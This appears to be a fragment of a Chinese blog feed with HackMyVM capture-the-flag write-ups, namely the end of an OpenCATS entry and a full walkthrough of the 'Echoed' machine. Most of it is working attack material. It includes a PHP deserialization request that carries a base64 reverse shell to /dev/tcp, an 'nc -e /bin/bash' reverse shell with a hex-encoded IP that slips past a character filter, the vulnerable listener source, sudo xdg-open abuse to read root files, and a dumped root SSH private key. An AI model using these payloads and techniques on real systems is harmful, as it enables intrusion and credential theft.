<pre class="language-bash" data-language="bash"><code class="language-bash">GET /index.php?m<span class="token operator">=</span>activity<span class="token operator">&amp;</span>parametersactivity%3AActivityDataGrid<span class="token operator">=</span>a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A77%3A%22YmFzaCAtYyAnYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjEuMTA1LzQ1NjcgIDA%2BJjEnCg%3D%3D%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A26%3A%22%2Fusr%2Flocal%2Fetc%2Fnewfile.txt%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D</code></pre>
<p>发过去然后监听kali就行了</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">nc</span> <span class="token parameter variable">-lnvp</span> <span class="token number">4567</span>                                                                                                                                                                                            <span class="token punctuation">[</span><span class="token number">23</span>:36:42<span class="token punctuation">]</span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.1.105<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.1.106<span class="token punctuation">]</span> <span class="token number">60308</span>
bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">43271</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
bash: no job control <span class="token keyword">in</span> this shell
root@kitty:~<span class="token comment"># id</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
<p>拿到root。</p>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>padbuster</tag>
        <tag>jwt</tag>
        <tag>openapi</tag>
        <tag>opencats</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-Echoed</title>
    <url>/posts/4dfb16e2/</url>
    <content><![CDATA[<p><strong>难度:medium</strong></p>
<p><strong>kali:192.168.1.101</strong></p>
<p><strong>靶机:192.168.1.110</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  arp-scan <span class="token parameter variable">-l</span>                                                                                                              <span class="token punctuation">[</span><span class="token number">23</span>:36:57<span class="token punctuation">]</span> Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.1.101
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.1.1     <span class="token number">78</span>:60:5b:04:b4:8c       TP-LINK TECHNOLOGIES CO.,LTD.
<span class="token number">192.168</span>.1.104   <span class="token number">44</span>:e5:17:0a:27:01       Intel Corporate
<span class="token number">192.168</span>.1.110   08:00:27:5f:d3:ff       PCS Systemtechnik GmbH</code></pre>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  nmap <span class="token parameter variable">-n</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sS</span> -p- --min-rate<span class="token operator">=</span><span class="token string">"5000"</span> <span class="token number">192.168</span>.1.110                                                                      <span class="token punctuation">[</span><span class="token number">23</span>:37:08<span class="token punctuation">]</span> Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-08-17 <span class="token number">23</span>:37 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.1.110
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0013s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65532</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT     STATE SERVICE
<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>
<span class="token number">80</span>/tcp   <span class="token function">open</span>  http
<span class="token number">4444</span>/tcp <span class="token function">open</span>  krb524
MAC Address: 08:00:27:5F:D3:FF <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">2.68</span> seconds
root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  <span class="token function">clear</span>                                                                                                                    <span class="token punctuation">[</span><span class="token number">23</span>:37:46<span class="token punctuation">]</span> root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> <span class="token number">192.168</span>.1.110 -p22,80,4444                                                                                   <span class="token punctuation">[</span><span class="token number">23</span>:37:50<span class="token punctuation">]</span> Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-08-17 <span class="token number">23</span>:38 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.1.110
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0041s latency<span class="token punctuation">)</span>.

PORT     STATE SERVICE VERSION
<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">7</span>.9p1 Debian <span class="token number">10</span>+deb10u2 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey:
<span class="token operator">|</span>   <span class="token number">2048</span> de:3a:50:8e:5d:21:09:7e:40:3f:b2:07:bb:41:08:7e <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> 5c:57:56:da:e5:1c:3e:bc:9a:a2:8d:6d:21:4e:bc:f9 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> f8:aa:dc:d3:27:52:e3:99:32:98:45:5b:52:f0:bc:e1 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp   <span class="token function">open</span>  http    nginx <span class="token number">1.14</span>.2
<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">)</span>.
<span class="token operator">|</span>_http-server-header: nginx/1.14.2
<span class="token number">4444</span>/tcp <span class="token function">open</span>  krb524?
<span class="token operator">|</span> fingerprint-strings:
<span class="token operator">|</span>   GetRequest:
<span class="token operator">|</span>     Command:Found illegal char.Command:
<span class="token operator">|</span>   NULL:
<span class="token operator">|</span>_    Command:
<span class="token number">1</span> <span class="token function">service</span> unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service <span class="token builtin class-name">:</span>
SF-Port4444-TCP:V<span class="token operator">=</span><span class="token number">7</span>.94SVN%I<span class="token operator">=</span><span class="token number">7</span>%D<span class="token operator">=</span><span class="token number">8</span>/17%Time<span class="token operator">=</span>66C0C3E1%P<span class="token operator">=</span>x86_64-pc-linux-gnu%r
SF:<span class="token punctuation">(</span>NULL,8,<span class="token string">"Command:"</span><span class="token punctuation">)</span>%r<span class="token punctuation">(</span>GetRequest,23,<span class="token string">"Command:Found<span class="token entity" title="\x20">\x20</span>illegal<span class="token entity" title="\x20">\x20</span>char\.
SF:Command:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
MAC Address: 08:00:27:5F:D3:FF <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least <span class="token number">1</span> <span class="token function">open</span> and <span class="token number">1</span> closed port
Device type: general purpose
Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>
Network Distance: <span class="token number">1</span> hop
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">4.09</span> ms <span class="token number">192.168</span>.1.110

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">178.37</span> seconds</code></pre>
<h2 id="命令执行getshell"><a href="#命令执行getshell" class="headerlink" title="命令执行getshell"></a>命令执行getshell</h2><p><img src="https://ooo.0x0.ooo/2024/08/17/OtyMpg.png" alt="OtyMpg.png" loading="lazy"><br>提示使用4444端口<br><img src="https://ooo.0x0.ooo/2024/08/17/OtyOfB.png" alt="OtyOfB.png" loading="lazy"><br>重启一下靶机</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">nc</span> <span class="token number">192.168</span>.1.110 <span class="token number">4444</span>                       <span class="token punctuation">[</span><span class="token number">0</span>:00:40<span class="token punctuation">]</span>
Command:ls
Found illegal char.Command:</code></pre>
<p>有点ctf了，过滤了一些字符</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">Executing:echo <span class="token string">"a"</span>
a
Command:a
Executing:echo <span class="token string">"a"</span>
a
Command:b
Executing:echo <span class="token string">"b"</span>
b
Command:c
Executing:echo <span class="token string">"c"</span>
c
Command:d
Found illegal char.Command:e
Executing:echo <span class="token string">"e"</span>
e</code></pre>
<p>应该是执行echo这个字符</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">Command:<span class="token variable"><span class="token variable">`</span>ss<span class="token variable">`</span></span>
Executing:echo <span class="token string">"<span class="token variable"><span class="token variable">`</span>ss<span class="token variable">`</span></span>"</span>
Netid State Recv-Q Send-Q                   Local Address:Port     Peer Address:Port                                                                            
u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>                                    * <span class="token number">12622</span>               * <span class="token number">12623</span>                                                                           
u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>                                    * <span class="token number">12682</span>               * <span class="token number">12683</span>                                                                           
u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>                                    * <span class="token number">12803</span>               * <span class="token number">12804</span>                                                                           
u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>      /var/run/dbus/system_bus_socket <span class="token number">12854</span>               * <span class="token number">12543</span>                                                                           
u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>                                    * <span class="token number">12852</span>               * <span class="token number">12853</span>                                                                           
u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>                                    * <span class="token number">12543</span>               * <span class="token number">12854</span>                                                                           
u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>                                    * <span class="token number">12853</span>               * <span class="token number">12852</span>                                                                           
u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>          /run/systemd/journal/stdout <span class="token number">12683</span>               * <span class="token number">12682</span>                                                                           
u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>                                    * <span class="token number">13469</span>               * <span class="token number">13470</span>                                                                           
u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>          /run/systemd/journal/stdout <span class="token number">12623</span>               * <span class="token number">12622</span>                                                                           
u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>                                    * <span class="token number">12552</span>               * <span class="token number">12855</span>                                                                           
u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>                                    * <span class="token number">13470</span>               * <span class="token number">13469</span>                                                                           
u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>      /var/run/dbus/system_bus_socket <span class="token number">13075</span>               * <span class="token number">13074</span>                                                                           
u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>                                    * <span class="token number">10998</span>               * <span class="token number">11095</span>                                                                           
u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>                                    * <span class="token number">11525</span>               * <span class="token number">11526</span>                                                                           
u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>                                    * <span class="token number">13074</span>               * <span class="token number">13075</span>                                                                           
u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>      /var/run/dbus/system_bus_socket <span class="token number">12855</span>               * <span class="token number">12552</span>                                                                           
u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>          /run/systemd/journal/stdout <span class="token number">12804</span>               * <span class="token number">12803</span>                                                                           
u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>                                    * <span class="token number">13275</span>               * <span class="token number">13276</span>                                                                           
u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>          /run/systemd/journal/stdout <span class="token number">13276</span>               * <span class="token number">13275</span>                                                                           
u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>          /run/systemd/journal/stdout <span class="token number">11095</span>               * <span class="token number">10998</span>                                                                           
u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>          /run/systemd/journal/stdout <span class="token number">11526</span>               * <span class="token number">11525</span>                                                                           
tcp   ESTAB <span class="token number">0</span>      <span class="token number">0</span>                        <span class="token number">192.168</span>.1.110:4444    <span class="token number">192.168</span>.1.101:58726  </code></pre>
<p>测试发现可以命令执行。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">Command:nc        
Executing:echo <span class="token string">"nc"</span>
<span class="token function">nc</span>
Command:-e
Executing:echo <span class="token string">"-e"</span>
<span class="token parameter variable">-e</span>
Command:/bin/bash
Executing:echo <span class="token string">"/bin/bash"</span>
/bin/bash</code></pre>
<p>想执行反弹shell，只有.被过滤用ip地址的16进制或者10进制都能绕过这个点</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">Command:<span class="token variable"><span class="token variable">`</span><span class="token function">nc</span> <span class="token parameter variable">-e</span> /bin/bash 0xC0A80165 <span class="token number">4567</span><span class="token variable">`</span></span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">nc</span> <span class="token parameter variable">-lnvp</span> <span class="token number">4567</span>                               <span class="token punctuation">[</span><span class="token number">0</span>:30:05<span class="token punctuation">]</span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.1.101<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.1.110<span class="token punctuation">]</span> <span class="token number">46302</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>charlie<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>charlie<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>charlie<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,25<span class="token punctuation">(</span>floppy<span class="token punctuation">)</span>,29<span class="token punctuation">(</span>audio<span class="token punctuation">)</span>,30<span class="token punctuation">(</span>dip<span class="token punctuation">)</span>,44<span class="token punctuation">(</span>video<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,109<span class="token punctuation">(</span>netdev<span class="token punctuation">)</span></code></pre>
<p>拿到shell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><pre class="language-bash" data-language="bash"><code class="language-bash">charlie@echoed:~$ <span class="token function">cat</span> flag.sh 
<span class="token comment">#!/bin/bash</span>
<span class="token builtin class-name">echo</span> <span class="token string">'\033[0;35m
                                   .     **                                     
                                *           *.                                  
                                              ,*                                
                                                 *,                             
                         ,                         ,*                           
                      .,                              *,                        
                    /                                    *                      
                 ,*                                        *,                   
               /.                                            .*.                
             *                                                  **              
             ,*                                               ,*                
                **                                          *.                  
                   **                                    **.                    
                     ,*                                **                       
                        *,                          ,*                          
                           *                      **                            
                             *,                .*                               
                                *.           **                                 
                                  **      ,*,                                   
                                     ** *,     \033[0m'</span>                                               



<span class="token builtin class-name">echo</span> <span class="token string">"-------------------------"</span>
<span class="token builtin class-name">echo</span> <span class="token string">"<span class="token entity" title="\n">\n</span>PWNED HOST: <span class="token variable"><span class="token variable">$(</span><span class="token function">hostname</span><span class="token variable">)</span></span>"</span>
<span class="token builtin class-name">echo</span> <span class="token string">"<span class="token entity" title="\n">\n</span>PWNED DATE: <span class="token variable"><span class="token variable">$(</span><span class="token function">date</span><span class="token variable">)</span></span>"</span>
<span class="token builtin class-name">echo</span> <span class="token string">"<span class="token entity" title="\n">\n</span>WHOAMI: <span class="token variable"><span class="token variable">$(</span><span class="token function">id</span><span class="token variable">)</span></span>"</span>
<span class="token builtin class-name">echo</span> <span class="token string">"<span class="token entity" title="\n">\n</span>FLAG: <span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> root.txt <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator">||</span> <span class="token function">cat</span> user.txt <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator">||</span> <span class="token builtin class-name">echo</span> <span class="token string">"Keep trying."</span><span class="token variable">)</span></span>"</span>
<span class="token builtin class-name">echo</span> <span class="token string">"<span class="token entity" title="\n">\n</span>------------------------"</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">charlie@echoed:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> flag.sh 
-rwxr-xr-x <span class="token number">1</span> charlie charlie <span class="token number">1920</span> Dec <span class="token number">16</span>  <span class="token number">2020</span> flag.sh</code></pre>
<p>只有charlie的权限所以只能读取user flag</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">charlie@echoed:~$ <span class="token function">cat</span> listener.py 
<span class="token comment">#!/usr/bin/env python</span>
<span class="token function">import</span> os
<span class="token function">import</span> socket
<span class="token function">import</span> subprocess

HOST <span class="token operator">=</span> <span class="token string">'0.0.0.0'</span>
PORT <span class="token operator">=</span> <span class="token number">4444</span>
allow_reuse_address <span class="token operator">=</span> True
s <span class="token operator">=</span> socket.socket<span class="token punctuation">(</span>socket.AF_INET, socket.SOCK_STREAM<span class="token punctuation">)</span>
s.bind<span class="token variable"><span class="token punctuation">((</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">))</span></span>
s.listen<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>
conn, addr <span class="token operator">=</span> s.accept<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> True:
        try:
                conn.send<span class="token punctuation">(</span><span class="token string">"Command:"</span><span class="token punctuation">)</span>
                comando <span class="token operator">=</span> conn.recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
                comando <span class="token operator">=</span> comando.strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
                comando2 <span class="token operator">=</span> <span class="token string">'echo "'</span> + comando + <span class="token string">'"'</span>
                <span class="token builtin class-name">command</span> <span class="token operator">=</span> <span class="token string">'Executing:'</span> + comando2 + <span class="token string">'\n'</span>
                print <span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span>
                chars <span class="token operator">=</span> set<span class="token punctuation">(</span><span class="token string">'d\fgjkl?mopqrtuv*,._'</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> any<span class="token punctuation">((</span>c <span class="token keyword">in</span> chars<span class="token punctuation">)</span> <span class="token keyword">for</span> <span class="token for-or-select variable">c</span> <span class="token keyword">in</span> comando<span class="token punctuation">)</span>:
                        conn.send<span class="token punctuation">(</span><span class="token string">'Found illegal char.'</span><span class="token punctuation">)</span>
                else:
                        output <span class="token operator">=</span> subprocess.check_output<span class="token punctuation">(</span>comando2, <span class="token assign-left variable">shell</span><span class="token operator">=</span>True<span class="token punctuation">)</span>
                        conn.send<span class="token punctuation">(</span>command<span class="token punctuation">)</span>
                        conn.send<span class="token punctuation">(</span>output<span class="token punctuation">)</span>
        except:
                <span class="token builtin class-name">continue</span></code></pre>
<p>把这个脚本保存下来以后出给小孩玩。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">charlie@echoed:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> charlie on echoed:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin

User charlie may run the following commands on echoed:
    <span class="token punctuation">(</span>ALL <span class="token builtin class-name">:</span> ALL<span class="token punctuation">)</span> NOPASSWD: /usr/bin/xdg-open</code></pre>
<p>搜了一下这个命令可以打开文件或者图片，用默认的编辑器，我直接读root flag</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">charlie@echoed:~$ <span class="token function">sudo</span> <span class="token function">xdg-open</span> /root/root.txt
WARNING: terminal is not fully functional
/root/root.txt  <span class="token punctuation">(</span>press RETURN<span class="token punctuation">)</span>HMVcharlied
/root/root.txt <span class="token punctuation">(</span>END<span class="token punctuation">)</span><span class="token punctuation">(</span>END<span class="token punctuation">)</span><span class="token punctuation">(</span>END<span class="token punctuation">)</span><span class="token punctuation">(</span>END<span class="token punctuation">)</span><span class="token punctuation">(</span>END<span class="token punctuation">)</span><span class="token punctuation">(</span>END<span class="token punctuation">)</span><span class="token punctuation">(</span>END<span class="token punctuation">)</span><span class="token punctuation">(</span>END<span class="token punctuation">)</span></code></pre>
<p>拿到root flag，但是没有拿到rootshell<br>读一下root的私钥</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">charlie@echoed:~$ <span class="token function">sudo</span> <span class="token function">xdg-open</span> /root/.ssh/id_rsa
WARNING: terminal is not fully functional
/root/.ssh/id_rsa  <span class="token punctuation">(</span>press RETURN<span class="token punctuation">)</span>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA7EqTEqxQiI+A27hayef+XQLgE91eQQ94tyvsEFWvQiLtSUwHhCKn
TXARwWcCc5uWFhMTAqL8mFncfYLYvRG2PhiasUgi+kIVjWQZPp/CAu/AMQCeELd2giWoz/
w4xuiz/jVkUiZtB4OUfGFbwkMFi5wqRM5d6TIGUQinfGiwiutWSusQ7cpxLgbtGGuuJe5Z
BOXYk4WDZfV+o8DiqTn/DSyADeQoyTYO6qfkcFN2lgVlGdEYx7CF5MS+DT/+b5dBpQGcTj
jDj+KLckJkt7GZ0fbhpzToiBETTBBDqzgeeN04QmAOlOubbcIwnB33+PEaWFtQMatGZQYC
ks9KBQv+lQAAA8hYRFboWERW6AAAAAdzc2gtcnNhAAABAQDsSpMSrFCIj4DbuFrJ5/5dAu
AT3V5BD3i3K+wQVa9CIu1JTAeEIqdNcBHBZwJzm5YWExMCovyYWdx9gti9EbY+GJqxSCL6
QhWNZBk+n8IC78AxAJ4Qt3aCJajP/DjG6LP+NWRSJm0Hg5R8YVvCQwWLnCpEzl3pMgZRCK
d8aLCK61ZK6xDtynEuBu0Ya64l7lkE5diThYNl9X6jwOKpOf8NLIAN5CjJNg7qp+RwU3aW
BWUZ0RjHsIXkxL4NP/5vl0GlAZxOOMOP4otyQmS3sZnR9uGnNOiIERNMEEOrOB543ThCYA
6U65ttwjCcHff48RpYW1Axq0ZlBgKSz0oFC/6VAAAAAwEAAQAAAQEAzdQoSRvRCyP2G297
pmVwLZVTm/o5IHNZtDWObKw2/mVuTWrtIS0Oj2YQEWipugrNsmzrImDXp96fMrXIFupW1c
CY/9TWoyjtnTyUwPhpCCXQRN9E0Ur+8F/drU8IJjyOjeH0gZr3XpQ/xBkK1S2MpxBhwY4C
QCBTYEMpojWPk3HAMbQNFddsPAPfLFk+4R6GPUKrUtOzzf/Kdwpn+PTFRjvytPfS7pbPAx
YHyM42rSNhy6jQlN1Iiu+EwUm1MBl9bTk5A6Jk3fvQWnBXoPZfjbgE/Kk2RZXZNW1a6MBG
URR5zjhWfu0NvJDm8z227UgwV7fXsUMyvBbeYFJHOuygAQAAAIEA6Inpgcu76BJkYcgTJD
PEwbtyyc/PE9vFYIwBENuUlz6jXT1TuhZ1FyY+pidQ607l0E+M7zwGrMb+PQP8l7KpMkbX
Y8IQydqs/XzNziO9RnQusXFcVCbsAKmYsLeCkbzOn4yWitA5cpgLs/bXrqGs2dFE/d8ifi
mLodRZj6/vLGwAAACBAPlu5m8XoaGK1XkF7Vlik4YoCNPnavRGB91fJg/M7M5YKKR7Y1ll
jmNX4TIIj+U5CuvIBf6TVS1fwn95ANv2o8oxVG7e4AHZpt3GQtP2yDLiHshzsj0W6NzzeI
dB2BClQgvukjzremccz8rHV3L9nYr1LYF/Rs6GgvsD72AZzgNJAAAAgQDygxopioQQ/Dup
/root/.ssh/id_rsaz6hTWng1LXgZ0EUBMqN5tCcGgTHvAeykiWpjl/zrK5QjDmjhKzYaHPBI/sUdgVA8o2R8ne
:hbS9N2ogWiJAF/XaU5behAdg1lTkfk6xNpF/1CVuK2gItW7yF1AGLMPLhD8nVlyx1429Ln
:eysx2HEd+7b7p0dU7QAAAAtyb290QGVjaG9lZAECAwQFBg<span class="token operator">==</span></code></pre>
<p>是有的，整理一下格式</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA7EqTEqxQiI+A27hayef+XQLgE91eQQ94tyvsEFWvQiLtSUwHhCKn
TXARwWcCc5uWFhMTAqL8mFncfYLYvRG2PhiasUgi+kIVjWQZPp/CAu/AMQCeELd2giWoz/
w4xuiz/jVkUiZtB4OUfGFbwkMFi5wqRM5d6TIGUQinfGiwiutWSusQ7cpxLgbtGGuuJe5Z
BOXYk4WDZfV+o8DiqTn/DSyADeQoyTYO6qfkcFN2lgVlGdEYx7CF5MS+DT/+b5dBpQGcTj
jDj+KLckJkt7GZ0fbhpzToiBETTBBDqzgeeN04QmAOlOubbcIwnB33+PEaWFtQMatGZQYC
ks9KBQv+lQAAA8hYRFboWERW6AAAAAdzc2gtcnNhAAABAQDsSpMSrFCIj4DbuFrJ5/5dAu
AT3V5BD3i3K+wQVa9CIu1JTAeEIqdNcBHBZwJzm5YWExMCovyYWdx9gti9EbY+GJqxSCL6
QhWNZBk+n8IC78AxAJ4Qt3aCJajP/DjG6LP+NWRSJm0Hg5R8YVvCQwWLnCpEzl3pMgZRCK
d8aLCK61ZK6xDtynEuBu0Ya64l7lkE5diThYNl9X6jwOKpOf8NLIAN5CjJNg7qp+RwU3aW
BWUZ0RjHsIXkxL4NP/5vl0GlAZxOOMOP4otyQmS3sZnR9uGnNOiIERNMEEOrOB543ThCYA
6U65ttwjCcHff48RpYW1Axq0ZlBgKSz0oFC/6VAAAAAwEAAQAAAQEAzdQoSRvRCyP2G297
pmVwLZVTm/o5IHNZtDWObKw2/mVuTWrtIS0Oj2YQEWipugrNsmzrImDXp96fMrXIFupW1c
CY/9TWoyjtnTyUwPhpCCXQRN9E0Ur+8F/drU8IJjyOjeH0gZr3XpQ/xBkK1S2MpxBhwY4C
QCBTYEMpojWPk3HAMbQNFddsPAPfLFk+4R6GPUKrUtOzzf/Kdwpn+PTFRjvytPfS7pbPAx
YHyM42rSNhy6jQlN1Iiu+EwUm1MBl9bTk5A6Jk3fvQWnBXoPZfjbgE/Kk2RZXZNW1a6MBG
URR5zjhWfu0NvJDm8z227UgwV7fXsUMyvBbeYFJHOuygAQAAAIEA6Inpgcu76BJkYcgTJD
